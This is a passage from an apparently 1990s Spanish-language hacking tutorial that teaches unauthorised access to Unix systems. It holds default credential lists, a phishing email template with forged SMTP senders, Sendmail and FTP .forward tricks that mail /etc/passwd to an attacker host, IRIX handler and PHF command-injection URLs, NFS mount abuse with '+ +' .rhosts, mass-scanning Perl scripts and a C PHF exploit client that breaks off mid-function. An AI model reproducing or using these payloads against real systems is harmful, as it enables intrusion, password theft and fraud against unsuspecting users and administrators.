  obtener una lista de sistemas conectados ejecuta `sh' `services' o `sh
  nodes'. En algunos sistemas DEC'S existen comandos como MODEM o DIAL que
  permiten hacer uso de un modem para llamadas externas que te permitiran
  marcar a BBS internacionales a expensas de la compaÏia que opera el DEC. Al
  hacer un telnet a este sistema sale algo del tipo:

  DECserver 700-08 Communications Server V1.1 (BL44G-11A) - LAT V5.1
  DPS502-DS700

  (c) Copyright 1992, Digital Equipment Corporation - All Rights Reserved

  Please type HELP if you need assistance

  Enter username> TNO

  Local>


  AIX

  IBM AIX Version 3 for RISC System/6000
  (C) Copyrights by IBM and by others 1982, 1990.
  login:

        Lo reconoceras porque es el unico sistema Unix que borra la pantalla y
  sale el login cerca del final de la pantalla.


  CISCO Router

                             FIRST BANK OF TNO
                           95-866 TNO VirtualBank
                          REMOTE Router -  TN043R1

                                Console Port

                                SN - 00000866

  TN043R1>


        Toda la info anterior expuesta anteriormente sobre los distintos
  sistemas, la he cogido basicamente de la red y la mayoria no la he
  comprobado por lo que es facil que haya errores por lo que os agradeceria
  que me contaseis todos los bugs que encontreis en esta parte del texto sobre
  distintos sistemas.

        Igualmente, estoy interesado en toda la info que me pueda mandar la
  gente sobre la identificacion de los distintos sistemas operativos y los
  comandos y diferencias basicas entre los sistemas operativos. Como siempre,
  mi mail esta abierto para este tipo de info ;--)

  3.- CONSEGUIR UNA CUENTA

        Una cuenta puede ser el primer paso para poder entrar en un sistema
  (aunque hay bugs que te dan directamente una cuenta e incluso la de rOOt,
  pero eso es caso aparte) por lo que en este capitulo se vera como conseguir
  una cuenta.

        Hay muchiiiiisimos metodos para conseguir una cuenta pero aqui se van
   a contar los siguientes:

  1.- Cuentas por defecto
  2.- Ingenieria social
  3.- Conseguir fichero passwd de manera remota con algun bug
  4.- Conseguir directamente una cuenta con un bug
  5.- PHF
  6.- Xploits que te dan una shell remota
  7.- Otros metodos

  4.1.- Cuentas por defecto

        Este es un metodo de locos y solo lo has de usar si vas muy perdido o
  si estas muy desesperado ya que raras veces funcionan. Sinceramente, yo no
  las he comprobado ya que nunca uso este metodo por lo que agradeceria
  vuestras rectificaciones para posteriores ediciones del texto. Incluso hay
  sistemas operativos muy raros que no se si seran viejos pero yo las incluyo
  todos por si a alguien les sirven de algo. En posteriores ediciones ya se
  hara un filtrado :o)

  Aqui estan para varios sistemas:

  Cuentas defaults en general:

  adm
  admin
  ann
  anon
  anonymous/anonymous
  backup
  batch
  bin
  checkfsys
  daemon
  demo
  diag
  field
  ftp
  games
  guest/guest
  guest/anonymous
  help
  install
  listen
  lp
  lpadmin
  maint
  makefsys
  mountfsys
  network
  news
  nobody
  nuucp
  nuucpa
  operator
  powerdown
  printer
  pub
  public
  reboot
  rje
  rlogin
  root
  sa
  setup
  shutdown
  startup
  sync
  sys/sys
  sysadm
  sysadmin
  sysbin/sysbin   sysbin/bin
  sysman
  system
  tech
  test
  trouble
  tty
  umountfsys
  user/user   user1/user1
  uucp
  uucpa
  visitor
  root/root
  root/system
  sys/sys
  sys/system
  daemon/daemon
  uucp/uucp
  tty/tty
  test/test
  unix/unix
  unix/test
  bin/bin
  adm/adm
  adm/admin
  admin/adm
  admin/admin
  sysman/sysman
  sysman/sys
  sysman/system
  sysadmin/sysadmin
  sysadmin/sys
  sysadmin/system
  sysadmin/admin
  sysadmin/adm
  who/who
  learn/learn
  uuhost/uuhost
  guest/guest
  host/host
  nuucp/nuucp
  rje/rje
  games/games
  games/player
  sysop/sysop
  root/sysop
  demo/demo
  decnet/ddennet
  guest/friend
  field/service
  guest/welcome
  system/manager
  default/user
  decnet/nonpriv
  field/digital
  field/test
  postmaster/mail
  sysmaint/service
  sysmaint/digital
  system/operator
  system/manager
  system/syslib
  system/uetp
  systest_clig/systest
  userp/user
  sysadmin/admin
  daemon/daemon
  sysbin/sysbin

  AIX

  guest           guest

  DECserver

  Access
  System

  VMS

  autolog1/autolog o autolog1
  cms/cms
  cmsbatch/cms o cmsbatch
  erep/erep
  maint/maint o maintain
  operatns/operatns o operator
  operator/operator
  rscs/rscs
  smart/smart
  sna/sna
  vmtest/vmtest
  vmutil/vmutil
  vtam/vtam
  field/service
  systest/utep
  systest_clig/systest
  systest_clig/uetp

  PRIME
 
  Prime/prime
  Prime/primos
  Primos/primos
  Primos/prime
  primos_cs/prime
  primos_cs/primos
  primenet/primenet
  system/system
  system/prime
  system/primos
  netlink/netlink
  test/test
  guest/guest
  guest1/guest
 
  DEC10

  1,2:        SYSLIB or OPERATOR or MANAGER
  2,7:        MAINTAIN
  5,30:       GAMES

  SGI Irix

  4DGifts
  guest
  demos
  lp
  nuucp
  tour
  tutor
  accounting
  boss
  demo
  manager
  pdp8
  pdp11
  software

  4.2.- INGENIERIA SOCIAL

        Bien, este no es un metodo de hack en el sentido que todos pensais...
  no tiene nada que ver con informatica ni con ordenadores ni tcp/ip ni unix
  ni nada de eso sino que simplemente consiste en ser un poco picaro ;o).

        La ingenieria social se basa en que hay mucha gente por ahi que tiene
  una cuenta (tanto de un proveedor de internet como una shell) y que no esta
  muy alerta jeje. En fin, como os comento hay varios metodos para obtener
  cuentas usando ingenieria social, aqui simplemente cuento algunos para que
  os hagais una idea pero cada uno que piense y su imaginacion le dara algunos
  truquillos mas.

        En fin, el metodo e-mail es el mas importante por el que sera el que
  mas desarrollaremos en este texto aunque tambien se podria hacer por
  telefono. La idea es sencilla.. enviar un mail (anonimo) a alguien para que
  te de el login y el password. Parece dificil que traguen, no?.. pues os
  puedo asegurar que no lo es. }-)

  Simplemente envia un mail de este estilo:

  Estimado se¤or Lopez:  (Importante conocer la identidad de la persona para 
  darle mas confianza)

        El objeto de este correo electronico es comunicarle que debido a
  mantener la seguridad de nuestro sistema victima.com, se requiere que envie
  un mail con sus datos personales y su login y su password ya que en nuestro
  sistema es muy importante la seguridad y deseamos mantenerla con estos
  chequeos rutinarios.

  Agradeciendo su atencion se despide

  Pepito Rodriguez   pepito@victima.com
  Administrador del sistema victima.com

        Para enviar un mail para falsear el remitente, lo que se debe hacer es
  hacer un telnet a una maquina unix que tenga el puerto 25 abierto y dar los
  siguientes pasos:

        Lo primero que se ha de hacer es un telnet maquinacon25.com 25, cuando
  te diga que ya estas conectado, has de hacer:

  helo ingenieria@social.com >pleased to meet ingenieria@social.com

        Tras esto has de decir quien quieres que aparezca como remitente con
  el comando mail from:

  mail from: ingenieria@social.com
      
            > ingenieria@social.com... Sender is valid.
    
        Si sale esto, todo va bien.. por lo que tendras que indicar quien es
  el destinatario usando el comando rcpt

  rcpt to: bill@gates.com

          > "bill@gates.com"... Recipient okay

        Tras esto, lo que se ha de hacer es indicar el mensaje en si con el
  comando data y cuando quieras acabar pones un . en una linea.. algo asi:

         data

         > Enter mail, end with "." on a line by itself

  Hola Bill
  .

         > Mail accepted

        Con esto el mensaje ya esta enviado, y para cerrar la conexion has de
  usar quit.

         > connection is closed.

        En realidad con esto no se consigue un mail anonimo sino que lo que 
  consigues es especificar el remitente que tu quieres. Para enviar mail
  anonimo has de usar servidores de correo anonimo o hacer este mensaje
  enlazando unos mails con otros.

  Para saber si un servidor es anonimo has de hacer:

  HELO servidor@anonimo.com

        Y si cuando el servidor responde no aparece tu IP por ningun lado,
  entonces es un servidor anonimo o pseudoanonimo.

        Este texto puede estar mucho mas elaborado.. pero ya os servira para
  ver la idea y creedme este metodo funciona y por otro lado no es complicado
  de hacer ;o)

        La pregunta ahora es... como sabemos los telefonos o los mails de la
  gente de victima.com???. Bien, hay varias respuestas.. muchas veces por
  casualidad (un vecino, un compa¤ero de clase, etc), otras pasandotelas otro
  hacker (a saber de donde vendran ­!) y algunos metodos mas entre los que
  destacaria el finger. El finger es el puerto 79 y si el host victima.com lo
  tiene abierto, simplemente telnetealo y usando finger -l @victima.com
  sacaras informacion sobre la gente que esta concectada a victima.com asi
  como otra informacion interesante como su email. Luego puedes ir probando
  con finger -l nombre_usuario@victima.com con lo que obtendras aun mas
  informacion del sistema.

        Tambien se puede hacer finger root@victima.com , guest@victima.com,
  etc con lo que obtendras informacion sobre ellos aunque no esten
  conectados.

        Tambien se ha de tener en cuenta que a veces el puerto 79 esta abierto
  pero no te da informacion. Esto puede ser porque esta usando tcp-wrappers,
  pero eso es tema aparte, simplemente lo comento para que sepais que os
  puede pasar.

        Este metodo, y usando este script, os puede hacer conseguir muchos 
  passwords pero hay que currarselo mucho :o(. Obviamente, solo pensando un 
  poco se te pueden ocurrir muchas mas maneras de aprovechar el finger ya que 
  da bastante informacion sobre los usuarios aunque esta informacion cuando es 
  realmente util es combinada con otros sistemas de ataque :)

        Hay muchos mas sistemas de ingenieria social como la chica necesitada
  de ayuda en el irc y cosas parecidas, pero tampoco creo que valga demasiado
  la pena explicarlo mas. Ademas, como en todos estos temas, el unico limite
  es tu imaginacion :o)

        Como es pesado buscar manualmente, puedes buscar maquinas con finger 
  usando un script hecho en shell y usando listas de hosts como las que se 
  explicaran en el apartado de nfs.

        Ademas, para los que veais que este metodo es un poco co¤azo, el
  script este siempre es util ya que tened en cuenta que las maquinas que
  tengan el finger abierto son maquinas que no estan muy concienciadas por la
  seguridad no?.. jeje.. mejor no sigo dando ideas :o) aunque tened en cuenta
  que esto no siempre sera cierto ya que es posible que usen los tcp-wrappers.

        Nota: El tcp-wrapper es un programa que permite filtrar ip por los
  distintos puertos e indicar que demonio o programa se ejecuta en cada uno
  de los puertos por lo que podeis ver todas las aplicaciones maleficas que
  pueden conseguir los roots usando este tipo de programas por lo que cuidado
  ahi fuera.

  4.3.- CONSEGUIR FICHERO DE PASSWD A TRAVES DE ALGUN BUG

        En fin, hay muchos bugs y xploits que te permiten el acceso al fichero
  de passwd pero aqui voy a exponer algunos que aunque son antiguos son
  bastante ilustrativos (para pillar xploits nuevos, a buscar por la red ke
  hay muchos.. de todos modos, en los apartados de pillar root, pondre xploits 
  modernos y que funcionan ;o).. estos los he elegido aunque sean un poco 
  antiguos porque son bastante ilustrativos:

   Sistemas: Unix's en general, espacialmente AIX y SUNOS 
   Versiones: Sendmail, versiones anteriores a la 5.57 que no esten parcheadas
   tumaquina% telnet victima.com 25 
   Trying X.Y.Z.A...
   Connected to victima.com  
   Escape character is '^]'.
   220 victima.com Sendmail 5.55 ready at Saturday, 6 Nov 93 18:04
   mail from: "|/bin/mail tu_direccion@de_correo.com < /etc/passwd"
   250 "|/bin/mail tu_direccion@de_correo.com < /etc/passwd"... Sender ok
   rcpt to: loquequieras
   550 loquequieras... User unknown
   data
   354 Enter mail, end with "." on a line by itself
   .
   250 Mail accepted
   quit
   Connection closed by foreign host.

  Notas:
  -victima.com = nombre del ordenador a hackear
  -mimaquina = nombre de nuestro ordenador
  -Lo que aparece con un numero delante son mensajes de nuestra victima, 
  el resto es lo que tienes que escribir.

        La idea de este bug, es que usualmente, en el sendmail en la linea de
  mail from: pondrias pepe@uno.es , pero sin embargo, y la gracia esta aqui,
  le dices que te mande el fichero /etc/passwd. Pero os digo una cosa
  sinceramente, este bug no funciona casi nunca, y si funciona, felicidades,
  estas en una maquina que el rOOt no tiene ni puta idea.

  Como conseguir el fichero /etc/passwd si el ftp esta mal configurado

        La victima debe de tener una copia completa del fichero /etc/passwd en
  su ftp anonimo -ftp/etc en vez de una version reducida. Sin embargo, puedes
  ver que normalmente nunca aparece el fichero verdadero :( , pero el home
  directory de "ftp" puede ser escribible en victim.com. Esto te permite
  ejecutar comandos remotamente - en este caso, mandarte el archivo por mail
  a ti mismo - por el simple metodo de crear un archivo .forward que ejecuta
  un comando cuando un mail es mandado a la cuenta "ftp".

   evil % cat forward_sucker_file
     "|/bin/mail zen@evil.com < /etc/passwd"

   evil % ftp victim.com
   Connected to victim.com
   220 victim FTP server ready.
   Name (victim.com:zen): ftp
   331 Guest login ok, send ident as password.
   Password:
   230 Guest login ok, access restrictions apply.
   ftp> ls -lga
   200 PORT command successful.
   150 ASCII data connection for /bin/ls (192.192.192.1,1129) (0 bytes).
   total 5
   drwxr-xr-x  4 101      1             512 Jun 20  1991 .
   drwxr-xr-x  4 101      1             512 Jun 20  1991 ..
   drwxr-xr-x  2 0        1             512 Jun 20  1991 bin
   drwxr-xr-x  2 0        1             512 Jun 20  1991 etc
   drwxr-xr-x  3 101      1             512 Aug 22  1991 pub
   226 ASCII Transfer complete.
   242 bytes received in 0.066 seconds (3.6 Kbytes/s)
   ftp> put forward_sucker_file .forward
   43 bytes sent in 0.0015 seconds (28 Kbytes/s)
   ftp> quit
   evil % echo test | mail ftp@victim.com
 
        Ahora simplemente tienes que esperar a que el fichero de passwords te
  sea enviado.


  Ejecutar comandos de manera remota en Irix con cgi-bin/handler

        El cgi-bin/handler en los sistemas IRIX permite la lectura y escritura
  de ficheros. Sin embargo existe un bug que da paso a la ejecucion remota de
  comandos. El sistema intentara abrir el fichero (taluego_Lucas) y si no
  existe dara un mensaje de error para a continuacion ğejecutar el comando
  que sigue. Muy importante, el espacio entre el comando cat y su argumento
  es un *tabulador* (TAB), no se admiten espacios asi que aunque podeis poner
  otro comando que no sea cat no podreis poner ningun comando que requiera
  espacios.

        $ telnet victima.com 80
        $ GET /cgi-bin/handler/taluego_Lucas;cat   /etc/passwd|?data=Download
        $ HTTP/1.0

        En IRIX 6.3 se intento arreglar esto pero lo unico que se consiguio
  fue que el formato del bug pase a ser:

        $telnet victima.com 80
        $GET /cgi-bin/handler/whatever;cat    /etc/passwd|   ?data=Download
        $HTTP/1.0

  Con un nuevo TAB para "enga¤ar" al script PERL.

        Hay muchos mas, pero no me apetece seguir buscando.. quiza para
  posteriores ediciones...ademas en esta categoria tambien entra el PHF que
  esta explicado mas adelante.

  4.4.- MOUNT

        Este no es un bug, sino un defecto de configuracion del NFS. Aqui voy
  a intentar explicarlo extensamente para que sepais lo que estais haciendo:

        El NFS (Network File System) es un sistema de red que permite que una 
  maquina servidor pueda hacer disponibles sistemas de archivos y dispositivos 
  perifericos a maquinas clientes. Asi, la maquina cliente podra montar esos 
  directorios pudiendolos usar como si los poseyera.

        Otra cosa muy distinta es lo que se pueda hacer con los ficheros
  incluidos en dichos directorios (si se pueden borrar, modificar, alterar
  los permisos, etc), lo cual depende de la configuracion del NFS. En
  realidad, no es dificil configurar el NFS para que no pueda haber problemas
  de seguridad, usando las opciones ro y rw en la configuracion que indican
  que clientes tienen acceso de lectura y escritura respectivamente. Por
  tanto, los problemas aparecen cuando no han sido utlidas estas opciones
  correctamente y cualquier usuario remoto puede leer y escribir... gracias a
  dios hay root que dan facilidades :o)

        Mount es el comando en unix que permite montar archivos en tu maquina
  para conseguir el objetivo expuesto anteriormente.

        Para ver si una maquina remota con NFS tiene files montables se hace
  siendo root en la maquina donde estas usando el comando showmount. Este
  comando se utiliza para determinar que sistema ha montado un sistema de
  archivos desde un sistema dado. Con el parametro -a muestra todos los
  sistemas de archivos que se han montado desde el nodo servidor mientras que
  el comando -e muestra la lista de todos los sistemas de archivos exportados.

  Como root, has de ejecutar en tu maquina:

  $root> showmount -e hostvictima.com
  mount clntudp_create: RPC: Port mapper failure - RPC: Unable to receive

        Si la respuesta es algo de este estilo... quiere decir que no ha
  habido suerte :o(

  $root> showmount -e otra.net
  Export list for otra.net:
  /var/mail                                 makina1.otra.net
  /home/user1                               makina1.otra.net
  /usr/local                                pluto.seva.net,rover.seva.net
  /export/X11R6.3                           makina2.otra.net
  /export/rover                             makina1.otra.net,makina2.otra.net

        En esta maquina no hay accesos del tipo everyone que sean interesantes
  :o( .. bueno con otras tecnicas mas avanzadas si.. pero no son el objeto de
  este texto ;o)

        Seguimos buscando hasta que encontremos una maquina victim.com que nos 
  ponga algo del tipo

  /home                   (everyone)
  o
  /                       (everyone)

  BINGO!!!!!

        Una vez pillemos una makina de estas caracteristicas, se pueden hacer 
  muchas cosas pero voy a explicar el metodo tipico expuesto en los textos de 
  hacking aunque pensando un poko se te pueden okurrir otros :)

        Lo que vamos a hacer es crear una cuenta rapper (rapper es el nombre
  de un usuario de la maquina remota.. para cada caso sera uno distinto) en
  nuestro fichero de passwd local ( es decir, el de nuestra maquina) y luego
  como usuario rapper ( cambiamos a ese usuario con el su) pondremos una
  entra .rhosts en su directorio home para poder hacer un rlogin sin password.

  Primero, creamos el directorio donde lo vamos a montar

  mimaquina:~>mkdir /tmp/mount
  mimaquina:~>mount -nt nfs victim.com:/home /tmp/mount/

        y con esto ya tendremos montado el directorio de la maquina remota en 
  nuestra maquina local con lo que haciendo un ls en /tmp/mount veremos todos 
  sus archivos :o)

  mimaquina:~>ls -lsa /tmp/mount/
  total 9
       1 drwxrwxr-x   8 root     root         1024 Jul  4 20:34 ./
       1 drwxr-xr-x  19 root     root         1024 Oct  8 13:42 ../
       1 drwxr-xr-x   3 at1      users        1024 Jun 22 19:18 at1/
       1 dr-xr-xr-x   8 ftp      wheel        1024 Jul 12 14:20 ftp/
       1 drwxrx-r-x   3 john     100          1024 Jul  6 13:42 john/
       1 drwxrx-r-x   3 139      100          1024 Sep 15 12:24 paul/
       1 -rw-------   1 root     root          242 Mar  9  1997 sudoers
       1 drwx------   3 test     100          1024 Oct  8 21:05 test/
       1 drwx------  15 102      100          1024 Oct 20 18:57 rapper/

        Vemos que hay un usuario llamado rapper cuyo UID (User Identification)
  es 102 por lo que lo tendremos que incluir en el /etc/passwd de nuestra
  maquina:

  mimaquina:~>echo "rapper::102:2::/tmp/mount:/bin/csh" >> /etc/passwd

  mimaquina:~>su - rapper
  Welcome to rapper's user.
  mimaquina:~>ls -lsa /tmp/mount/
   total 9
        1 drwxrwxr-x   8 root     root         1024 Jul  4 20:34 ./
        1 drwxr-xr-x  19 root     root         1024 Oct  8 13:42 ../
        1 drwxr-xr-x   3 at1      users        1024 Jun 22 19:18 at1/
        1 dr-xr-xr-x   8 ftp      wheel        1024 Jul 12 14:20 ftp/
        1 drwxrx-r-x   3 john     100          1024 Jul  6 13:42 john/
        1 drwxrx-r-x   3 139      100          1024 Sep 15 12:24 paul/
        1 -rw-------   1 root     root          242 Mar  9  1997 sudoers
        1 drwx------   3 test     100          1024 Oct  8 21:05 test/
        1 drwx------  15 rapper   daemon       1024 Oct 20 18:57 rapper/

        Asi, poseemos el directorio de rapper por lo que podemos usar las
  propiedades del .rhosts ( escribimos + + en su .rhosts y luego hacemos un
  rlogin):

  mimaquina:~>echo "+ +" > rapper/.rhosts
  mimaquina:~>cd /
  mimaquina:~>rlogin -l rapper victima.com
  Welcome to Victima.Com.
  SunOs ver....(crap).
  victima:~$

  y ya tienes una cuenta en el sistema ­!

  Para desmontar el archivo, sal de este directorio y ejecuta:

  mimaquina:~> umount /tmp/mount

        Tened en cuenta que para este metodo, hemos de tener acceso a la
  maquina por rlogin, asi que si no es el caso, este metodo tambien admite
  otras posibilidades pero eso se deja para otro texto :)


        Como lo mas co¤azo de este metodo es buscar maquinas con ficheros 
  exportables, a continuacion expongo un script escrito por Invisble Evil en
  perl que te permite buscar automaticamente. Para usarlo previamente se han
  de conseguir listas de maquinas que se pueden obtener usando el host -l 
  nombredominio > salida y luego usando un script para obtener los ip del
  fichero salida o se pueden obtener listas de maquinas que hay en internic
  (se obtienen por ftp de rs.internic.net) y que son listas de maquinas con
  esa extension:

  com.zone.gz
  edu.zone.gz
  gov.zone.gz
  mil.zone.gz
  net.zone.gz
  org.zone.gz

        cuando tengas estos files bajados y tras hacer un gunzip, tendras que
  ejecutar el script en perl:

  "perl getdomain.pl com.zone com >com.all"
  perl getdomain.pl edu.zone edu >edu.all

        Y asi con todos, obteniendo ficheros com.all, edu.all y sucesivamente
  donde tendras la lista de maquinas.

------------ Codigo Fuente ---------------------------------------------------

getdomain.pl
---- cut here
#!/usr/bin/perl

# GetDomain By Nfin8 / Invisible Evil
# Questions /msg i-e  or  /msg i^e
#
# Retrieve command line arguments.
my($inputfile, $domain) = @ARGV;
usage() if (!defined($inputfile) || !defined($domain));

# Open and preprocess the input file.
open(INFILE, "<$inputfile") or die("Cannot open file $inputfile for
reading!\n");
my(@lines) = <INFILE>;

# Initialize main data structure.
my(%hash) = {};
my($key) = "";

foreach (@lines) {
  $key = (split(/\ /))[0];
  chop($key);
  next if ((($key =~ tr/.//) < 1) || 
            (uc($domain) ne uc(((split(/\./, $key))[-1]))) || 
            ($key =~ m/root-server/i));
  $hash{$key}++;
}

# Close input file and output data structure to STDOUT.
close(INFILE);

foreach (sort(keys(%hash))) {
  print "$_\n";
}

sub usage {
  print("\n\ngetdomain:\n");
  print("Usage: getdomain [inputfile] [search]\n\n");
  print("Where [search] is one of \'com\', \'edu\', \'gov\', \'mil\' or
        \'net\'.\n\n");
  exit(0);
}
  
0;
  
------------ FIN -------------------------------------------------------------

        Tras obtener la lista de maquinas usando el anterior script (edu.all,
  com.all, etc..), se ha de usar el script que se expone a continuacion para
  obtener los resultados del showmount -e:

        En cada dominio, este script busca si hay discos montables y guarda
  la info en el directorio actual en ficheros llamados domain.XXX.export...
  asi solo tienes que ver estos logs y mirar si ha habido suerte !!!!
 
------------ Codigo Fuente ---------------------------------------------------

#/usr/bin/perl -w
#
# Check NFS exports of hosts listed in file.
# (Hosts are listed, once per line with no additional whitespaces.)
#
# ii@dormroom.pyro.net - 2/27/97.

# Assign null list to @URLs which will be added to later.
my(@result) = ();
my(@domains) = ();
my($program) = "showmount -e ";

# Pull off filename from commandline. If it isn't defined, then assign
# default.
my($DomainFilename) = shift;
$DomainFilename = "domains" if !defined($DomainFilename);

# Do checking on input.
die("mountDomains: $DomainFilename is a directory.\n") if (-d 
$DomainFilename);
 
# Open $DomainFilename.
open(DOMAINFILE, $DomainFilename) or 
  die("mountDomains: Cannot open $DomainFilename for input.\n");
  
while (<DOMAINFILE>) {
  chomp($_);
  print "Now checking: $_";

  # Note difference in program output capture from "geturl.pl".  
  open (EXECFILE, "$program $_ |");
  @execResult = <EXECFILE>;
  next if (!defined($execResult[0]));
  if ($execResult[0] =~ /^Export/) {
    print " - Export list saved.";
    open (OUTFILE, ">$_.export");
    foreach (@execResult) {
      print OUTFILE;
    }
    close (OUTFILE);
  }
  close(EXECFILE);
  print "\n";
}
  
# We are done. Close all files and end the program.
close (DOMAINFILE);

0;

------------ FIN -------------------------------------------------------------

        Una nota final a todo este co¤azo, lo pongo aqui para que solo lo lean
  los que se leen los textos enteros (jeje) es que /export/foo es el home
  directory del usuario guest por lo que aunque no nos dejen exportar el
  directorio /home, en caso de que nos dejen exportar el directorio /export,
  se podra aplicar este mismo metodo pero teniendo en cuenta de que en lugar
  de usar el usuario rapper se usara el usuario guest

  suerte ahi fuera......

  4.5.- PHF

        Este sistema es antiguo y ampliamente conocido por todo el mundo, pero 
  aunque parezca mentira sigue funcionando y por ello lo expongo en este
  texto.

        El phf es un fichero que se encuentra en el directorio /cgi-bin de
  maquinas unix que ofrezcan este servicio y sirve para buscar direcciones,
  pero habilmente utilizado puede servir para ejecutar comandos remotos sobre
  dicha maquina pero no se pueden usar pipes, quotes, etc. En este texto nos
  vamos a centrar en su uso para la obtencion del fichero passwd de un sistema
  aunque pensando un poco se le pueden dar otras aplicaciones bastante
  interesantes ya que te permite ejecutar comandos en la maquina victima.

        Vamos a empezar comentando el uso mas extendido para luego dar otras 
  ayudas para su uso asi como otras aplicaciones:

  Asi, escribe en tu navegador:

  http://www.victima.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
        (        1      )(     2    )(     3   )(   4  )(5)(    6    )

   1.- El site que quieras atacar.
   2.- El comando phf.
   3.- Aqui es donde esta el secreto.
   4.- El programa que quieres que se ejecute.
   5.- El %20 es un espacio, y se pueden usar tantos como te hagan falta.
   6.- Y pues aqui va el archivo o directorio que quieres ver.

  Tras ejecutar este xploit, pueden suceder varias cosas:

        1.- Que no se encuentre el archivo phf, porque los administradores
  que son un poco mas listos han desactivado esta opcion o que sea astuto y
  un poco borde y te mande algun nuke al intentarlo .. todo no iba a ser
  bonito­!! :o( Esto pasa en algunas maquinas sobre todo si son de hackers :o)

        2.- Que te salga el archivo, pero los password no estan de la manera
  habitual. Entonces, pueden pasar dos cosas, que este shadow o que este el
  NIS instalado. Si estamos en el segundo caso, se puede identificar porque en
  la ultima linea del fichero tiene una cadena parecida a esta "+::0:0:::" Si
  NO TE SALE, intenta poner en la linea del navegador, en vez de /etc/passwd
  pues /etc/shadow u otro archivo dependiendo del sistema ( si el httpd rula
  como root). Si TE SALE la cadena "+::0:0:::" estas de suerte, porque eso
  indica que tiene activado el sistema de archivos NIS, y por lo cual
  posiblemente funcione el comando "ypcat" para leer el passwd. La linea seria
  la siguiente:

  http://www.victima.com/cgi-bin/phf?Qalias=x%0a/bin/ypcat%20passwd 

        Con esto te saldran todas las cuentas sin sombrear, o sea lo que
  quiere decir que puedes crackear el fichero passwd

  Si todo sale bien el resultado sera del tipo:

                                 QUERY RESULTS

  /usr/local/bin/ph -m alias=x cat /etc/passwd

  root:R0rmc6lxVwi5I:0:0:root:/root:/bin/bash
  bin:*:1:1:bin:/bin:
  daemon:*:2:2:daemon:/sbin:
  adm:*:3:4:adm:/var/adm:
  lp:*:4:7:lp:/var/spool/lpd:
  sync:*:5:0:sync:/sbin:/bin/sync
  shutdown:*:6:0:shutdown:/sbin:/sbin/shutdown
  halt:*:7:0:halt:/sbin:/sbin/halt
  mail:*:8:12:mail:/var/spool/mail:
  news:*:9:13:news:/usr/lib/news:
  uucp:*:10:14:uucp:/var/spool/uucppublic:
  operator:*:11:0:operator:/root:/bin/bash
  games:*:12:100:games:/usr/games:
  man:*:13:15:man:/usr/man:
  postmaster:*:14:12:postmaster:/var/spool/mail:/bin/bash
  nobody:*:-2:100:nobody:/dev/null:
  ftp:*:404:1::/home/ftp:/bin/bash
  guest:*:405:100:guest:/dev/null:/dev/null
  bhilton:LkjLiWy08xIWY:501:100:Bob Hilton:/home/bhilton:/bin/bash
  web:Kn0d4HJPfRSoM:502:100:Web Master:/home/web:/bin/bash
  mary:EauDLA/PT/HQg:503:100:Mary C. Hilton:/home/mary:/bin/bash

        Y una vez tienes este texto en la pantalla de tu navegador, solo
  tienes que hacer un guardar como.

        Pero el PHF te da muchas mas posibilidades, ya que si el server esta
  corriendo su httpd server como root, se puede obtener el acceso de root.

  Usando 

  http://www.victima.com/cgi-bin/phf?Qalias=x%0a/usr/bin/id

        Usamos el id para conocer la identificacion del user. Recuerda que el
  root es id=0 aunque lo usual es que corra bajo nobody y te saldria algo de
  este tipo:

                                 QUERY RESULTS

  /usr/local/bin/ph -m alias=x id

  uid=65534(nobody) gid=65535(nogroup) groups=65535(nogroup)


        Si en lugar de correr como usuario nobody, corriese como root,
  podriamos usar comandos como root, interesante no??

  http://www.victima.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
  http://www.victima.com/cgi-bin/phf?Qalias=x%0a/bin/ypcat%20passwd 

        Estos dos ya han sido explicados anteriormente. El que muestro a
  continuacion podria ser util para ver todos los ficheros del directorio
  /etc que empiezan con la palabra pass.

  http://www.victima.com/cgi-bin/phf?Qalias=x%0als%20-al%20/etc/pass*

        Los tres comandos anteriores funcionaran aunque no corra como root,
  pero para los siguientes si que es necesario el root, pero son los mas
  interesantes:

  Cambiar el password del root (no funciona mucho pero si a veces):

  http://www.victima.com/cgi-bin/phf?Qalias=x%0apasswd%20root

        Ademas, hay que pensar que una makina kon phf y ke el httpd rule komo
  root es practicamente como si tuviesemos una cuenta de root en la maquina,
  asi que ya sabeis........ kreo ke sobran los komentarios no?  }-)

        Bien, todo lo que he contado es suponiendo que usais el navegador como
  el Netscape para el ventanukos o usar el Netscape o lynx para linux, pero
  adjunto un programa para que podais usar comandos para el phf desde el
  shell que es mas comodo y ademas si usais una maquina de condon, no teneis
  que depender de si esa maquina tiene navegadores o no.

  En fin, el codigo es el siguiente:

------------ Codigo Fuente ---------------------------------------------------

/* Some small changes for efficiency by snocrash. */
/*
 * cgi-bin phf exploit by loxsmith [xf]
 *
 * I wrote this in C because not every system is going to have lynx.  Also,
 * this saves the time it usually takes to remember the syntatical format
 * of the exploit.  Because of the host lookup mess, this will take
 * approximately 12 seconds to execute with average network load.  Be patient.
 *
 */

#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <errno.h>

int main(argc, argv)
     int argc;
     char **argv;
{
     int i = 0, s, port, bytes = 128;
     char exploit[0xff], buffer[128], hostname[256], *command, j[2];
     struct sockaddr_in sin;
     struct hostent *he;

     if (argc != 3 && argc != 4) {
          fprintf(stderr, "Usage: %s command hostname [port]", argv[0]);
          exit(1);
     }

     command = (char *)malloc(strlen(argv[1]) * 2);

     while (argv[1][i] != '\0') {
          if (argv[1][i] == 32) strcat(command, "%20"); else {
               sprintf(j, "%c", argv[1][i]);
               strcat(command, j);
          }
          ++i;
     }

     strcpy(hostname, argv[2]);
     if (argc == 4) port = atoi(argv[3]); else port = 80;

     if (sin.sin_addr.s_addr = inet_addr(hostname) == -1) {
          he = gethostbyname(hostname);
	  if (he) {
               sin.sin_family = he->h_addrtype;
               memcpy((caddr_t) &sin.sin_addr, he->h_addr_list[0], 
                      he->h_length);
          } else {
               fprintf(stderr, "%s: unknown host %s\n", argv[0], hostname);
               exit(1);
          }
     }
     sin.sin_family = AF_INET;
     sin.sin_port = htons((u_short) port);

     if ((s = socket(sin.sin_family, SOCK_STREAM, 0)) < 0) {
          fprintf(stderr, "%s: could not get socket\n", argv[0]);
          exit(1);
     }

     if (connect(s, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
          close(s);
          fprintf(stderr, "%s: could not establish connection\n", argv[0]);
          exit(1);
     }

     sprintf(exploit, "GET /cgi-bin/phf/?Qalias=X%%0a%s\n", command);
     free(command);
     write(s, exploit, strlen(exploit));
     while(bytes == 128) {
          bytes = read(s, buffer, 128);
          fprintf(stdout, buffer);
     }
     close(s);
